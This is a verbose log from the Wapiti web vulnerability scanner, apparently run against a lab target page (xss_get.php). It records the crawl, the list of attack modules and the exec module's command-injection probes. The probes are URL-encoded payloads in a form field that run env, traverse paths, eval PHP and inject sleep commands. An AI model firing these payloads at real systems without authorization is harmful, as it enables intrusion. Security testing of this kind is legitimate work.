2024-03-20 16:49:38.225 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.340 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit (1)
2024-03-20 16:49:38.341 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:49:38.341 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48
2024-03-20 16:49:38.342 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php (1)
2024-03-20 16:49:38.518 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-20 16:49:38.518 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_29bea0c3.db
2024-03-20 16:49:38.524 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 5 URLs and forms during the scan
2024-03-20 16:49:38.596 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-20 16:49:38.596 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-20 16:49:38.700 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-20 16:49:38.700 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-20 16:49:38.701 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-20 16:49:38.715 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.718 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%3Benv%3B&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.728 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%7Cenv%7C&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.737 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=a%3Benv%3B&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.749 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=a%3Benv%3B&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.759 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.770 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz%3Benv%3B&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.781 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz%0Aenv%3B&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.789 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%26set%26&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.798 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=set&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.805 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=env&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.814 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%2Fe%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.822 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.831 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.838 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.846 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.853 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.861 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.869 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.877 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.885 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.894 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.901 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.910 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.918 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.927 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=a%60%29%60&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.934 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=a%60sleep%2060%60&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.943 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=a%3Bsleep%2060%3B&firstname=fuzz&form=submit (0)
